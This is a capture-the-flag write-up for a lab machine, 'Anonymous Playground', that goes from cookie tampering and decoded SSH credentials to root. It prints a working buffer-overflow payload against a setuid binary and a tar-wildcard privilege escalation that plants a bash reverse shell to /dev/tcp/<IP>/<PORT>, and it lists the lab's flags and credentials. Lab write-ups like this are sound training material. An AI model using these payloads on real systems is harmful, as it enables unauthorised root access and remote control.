# ANONYMOUS PLAYGROUND

## FLAG 1
1 disallowed entry on robots.txt. Check it out and say access denied. Change cookie `access` to `granted`.

Then a weird line of string was given. After decrypting with [this program](decrypt.py), a username and password was shown.
```
hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
tips: zA = a
z = 26
A = 1

(26 + 1) % 26 = 1 = a

magna:magnaisanelephant
```

After ssh into the machine with the credentials, we got the first flag.
```
flag1 = 9184177ecaa83073cbbf36f1414cc029
```

## FLAG 2
In the home drectory of magna, there is a binary call hacktheworld. This binary also has a setuid bit set. After downloading it, I open it using ghidra. The vulnerable part in the code is the `gets()` function which is vulnerable towards buffer overflow. There is also a `call_bash` function which set the uid after some command and call bash. So I just need to exploit this and we should be able to proceed to the next user.

After a few tries, 72 'A's is the perfect sie for overflowing the buffer. Then the address of the `call_bash` function, which I got from running `readelf -s ./hacktheworld | grep -i call_bash`, was appended to the payload. Notice that there is a `cat` command after the printing with python. This is to prevent the shell from closing immediately due to no input was provided.
```
(python3 -c 'print("A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00")'; cat) | ./hacktheworld
```

Running the command above, we're now in as spooky. Navigate to his home directory and the second flag is there.
```
flag2 = 69ee352fb139c9d0699f6f399b63d9d7
```

## FLAG 3
Now onto the road of rooting the machine. Checking on the `/etc/crontab`, we see that there is a command `cd /home/spooky && tar -zcf /var/backups/spooky.tgz *`, which is run by root every minute. This is a well known exploit of tar, the wildcard exploit! 

```
echo 'bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"' > shell.sh
echo "" > '--checkpoint-action=exec=sh shell.sh'
echo "" > '--checkpoint=1'
``` 

After the above command, we set up a listener on our machine and wait for incoming connections. After awhile, we're in as root. Navigate to `/root` to retrieve the last flag.
```
flag3 = bc55a426e98deb673beabda50f24ce66
```